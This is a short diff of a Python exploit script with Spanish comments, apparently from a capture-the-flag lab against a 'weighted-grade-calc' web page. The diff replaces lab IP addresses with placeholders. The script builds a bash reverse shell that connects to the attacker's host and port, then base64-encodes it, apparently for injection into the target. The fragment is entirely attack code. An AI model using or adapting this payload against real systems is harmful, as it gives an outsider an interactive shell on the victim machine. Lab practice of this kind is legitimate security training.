@@ -1,9 +1,9 @@
 
    4   │ # URL de la máquina atacada
-   5   │ url = "http://10.10.11.253/weighted-grade-calc"
+   5   │ url = "http://IP VICTIMA/weighted-grade-calc"
    6   │ 
    7   │ # Shell inversa para conectarse a la máquina atacante
-   8   │ rev_shell = b'/bin/bash -i >& /dev/tcp/10.10.14.207/1234 0>&1'
+   8   │ rev_shell = b'/bin/bash -i >& /dev/tcp/IP ATACANTE/PUERTO ATACANTE 0>&1'
    9   │ 
   10   │ # Codificación base64 del comando de shell inverso
   11   │ encoded_data = base64.b64encode(rev_shell)
